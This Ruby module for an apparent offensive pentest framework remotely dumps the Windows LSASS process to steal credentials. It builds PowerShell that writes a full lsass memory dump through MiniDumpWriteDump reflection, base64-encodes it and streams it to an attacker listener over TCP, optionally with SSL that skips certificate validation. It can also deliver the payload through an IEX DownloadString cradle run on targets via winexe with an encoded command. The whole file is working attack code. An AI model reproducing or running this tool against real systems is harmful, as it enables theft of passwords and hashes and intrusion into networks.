require 'poet'
require 'lib_meta'
require 'server'
class LsassDump < Poet::Scanner
  include Lib_meta
  include Server::Info

  self.mod_name = "Dump Lsass process with Powershell"
  self.description = "Dump Lsass process to extract clear text passwords off the workstations/servers"
  self.invasive = true

  def psh_command(host,port,ssl)
    save_path = "c:\\windows\\temp\\#{random_name}.dmp"
    proc_dump = %(if([IntPtr]::Size -eq 4){$arch='_32_'}else{$arch='_64_'};$comp_name=(gc env:computername)+$arch+'lsass.dmp';$proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id;)
    proc_dump << %($WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');)
    proc_dump << %($WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';)
    proc_dump << %($MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2;)
    proc_dump << %($FileStream = New-Object IO.FileStream('#{save_path}', [IO.FileMode]::Create);)
    proc_dump << %($Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));)
    proc_dump << %($FileStream.Close();$lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{save_path}"));)
    proc_dump << %($socket = New-Object Net.Sockets.TcpClient('#{host}', #{port.to_i});$stream = $socket.GetStream();)
    if ssl
      proc_dump << %($sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));)
      proc_dump << %($sslStream.AuthenticateAsClient('#{host}');$writer = new-object System.IO.StreamWriter($sslStream);)
      proc_dump << %($writer.WriteLine($comp_name);$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
    else
      proc_dump << %($writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($comp_name);$writer.flush();)
      proc_dump << %($writer.WriteLine($lsass_file);$writer.flush();$socket.close())
     end
  end

  def setup
    # Print title
    puts
    title = "Lsass Dumper"

    server = Server.new
    host = rgets("Would you like to host the payload on a web server? [#{color_banner('n')}|#{color_banner('y')}] : ", "n")
    lhost, lport = get_meter_data
    print_warning('SSL is very slow uploading')
    ssl = rgets("Use SSL for file transfer? [#{color_banner('n')}|#{color_banner('y')}] : ", "n")
    if ssl == 'y'
      ssl = true
    else
      ssl = false
    end
    if host == 'y'
      url = get_url
      port = get_port(url)
      host = get_host(url)
      web_ssl = url.is_ssl?
      # Start web server
      Thread.new { server.raw_web( host, port, psh_command(lhost,lport,ssl), web_ssl ) }
      # Start Listener for file
      Thread.new { server.base64_upload( lhost, lport, ssl ) }
      ps_command = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
      ps_command << "IEX (New-Object Net.WebClient).DownloadString('#{url}')"
      @encoded_ps = ps_command.to_ps_base64!
    else
      Thread.new { server.base64_upload( lhost, lport, ssl) }
      @encoded_ps = psh_command( lhost, lport, ssl ).to_ps_base64!
    end
  end

  def run(username, password, host)
    ps_args = "cmd /c echo . | powershell -enc #{@encoded_ps}"
    winexe("//#{host}", ps_args)
    print_status("Command Sent for #{host}")
    print_good("#{host.ljust(15)} - Powershell command completed")
  end

  def finish
    puts "\nPowershell module completed"

    # Return to menu
    puts
    print "Press enter to return to Exploitation Menu"
    gets
  rescue => e
    puts e
  end
end